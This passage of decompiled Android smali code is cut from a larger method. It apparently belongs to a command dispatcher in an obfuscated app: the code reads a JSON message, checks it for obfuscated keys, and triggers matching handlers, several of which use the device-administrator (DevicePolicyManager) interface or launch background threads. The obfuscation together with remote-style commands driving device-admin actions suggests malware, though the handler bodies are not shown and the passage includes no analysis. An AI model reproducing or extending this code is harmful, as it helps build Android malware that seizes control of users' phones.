    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    :cond_9
    :goto_1
    return-void

    :cond_a
    :try_start_2
    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->aecbla89ntoa8:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_b

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v3, p0, Lcom/azianames/foroneyhar/filnnomn;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    iget-object v4, p0, Lcom/azianames/foroneyhar/filnnomn;->cehyzt7dw:Landroid/content/ComponentName;

    invoke-static {v1, v3, v4}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;Landroid/content/ComponentName;)V

    :cond_b
    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->eyli1ymagd3o:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_c

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->eyli1ymagd3o:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ozpoxuz523b2(Landroid/content/Context;Ljava/lang/String;)V

    :cond_c
    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->sgnd7s4:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_d

    invoke-virtual {p0}, Lcom/azianames/foroneyhar/filnnomn;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v3, p0, Lcom/azianames/foroneyhar/filnnomn;->ozpoxuz523b2:Landroid/app/admin/DevicePolicyManager;

    invoke-static {v1, v3}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Landroid/app/admin/DevicePolicyManager;)V

    :cond_d
    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->ty7df019s:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_e

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->ty7df019s:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {p0, v1}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->usuayu88rw4(Landroid/content/Context;Ljava/lang/String;)V

    :cond_e
    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->kld4qxthnxo5uo:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_f

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->kld4qxthnxo5uo:Ljava/lang/String;

    invoke-virtual {v2, v1}, Lorg/json/JSONObject;->getJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v1

    :goto_2
    invoke-virtual {v1}, Lorg/json/JSONArray;->length()I

    move-result v3

    if-ge v0, v3, :cond_f

    invoke-virtual {v1, v0}, Lorg/json/JSONArray;->getString(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {p0, v3}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->uin6g3d5rqgcbs(Landroid/content/Context;Ljava/lang/String;)V

    add-int/lit8 v0, v0, 0x1

    goto :goto_2

    :cond_f
    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->b6p1j7hoons8:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_10

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->b6p1j7hoons8:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->bjcn50q4e9:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    sget-object v3, Lcom/azianames/foroneyhar/ttmhx7;->jaztd5t99d:Ljava/lang/String;

    invoke-virtual {v0, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    sget-object v4, Lcom/azianames/foroneyhar/ttmhx7;->wg4f90m80dyc0s:Ljava/lang/String;

    invoke-virtual {v0, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    sget-object v5, Lcom/azianames/foroneyhar/ttmhx7;->s6o869vduri:Ljava/lang/String;

    invoke-virtual {v0, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v1, v3, v4, v0}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->ttmhx7(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    :cond_10
    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->ol99ycz2wbkd:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_11

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->ol99ycz2wbkd:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {p0, v0}, Lcom/azianames/foroneyhar/a/ozpoxuz523b2;->cehyzt7dw(Landroid/content/Context;Ljava/lang/String;)V

    :cond_11
    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->zs1ge47fq1dgv5:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->zs1ge47fq1dgv5:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_12

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v3, 0x2

    const/4 v4, 0x0

    invoke-direct {v1, p0, p0, v3, v4}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_12
    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->xbcow1jyae:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->xbcow1jyae:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getBoolean(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_13

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v3, 0x3

    const/4 v4, 0x0

    invoke-direct {v1, p0, p0, v3, v4}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :cond_13
    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->ijavw7l1x:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_9

    sget-object v0, Lcom/azianames/foroneyhar/ttmhx7;->ijavw7l1x:Ljava/lang/String;

    invoke-virtual {v2, v0}, Lorg/json/JSONObject;->getJSONObject(Ljava/lang/String;)Lorg/json/JSONObject;

    move-result-object v0

    sget-object v1, Lcom/azianames/foroneyhar/ttmhx7;->wg4f90m80dyc0s:Ljava/lang/String;

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Ljava/lang/Thread;

    new-instance v2, Lcom/azianames/foroneyhar/fxug2rdnfo;

    const/4 v3, 0x4

    const/4 v4, 0x1

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    aput-object v0, v4, v5

    invoke-direct {v2, p0, p0, v3, v4}, Lcom/azianames/foroneyhar/fxug2rdnfo;-><init>(Lcom/azianames/foroneyhar/filnnomn;Lcom/azianames/foroneyhar/ozpoxuz523b2;I[Ljava/lang/String;)V

    invoke-direct {v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto/16 :goto_1
.end method
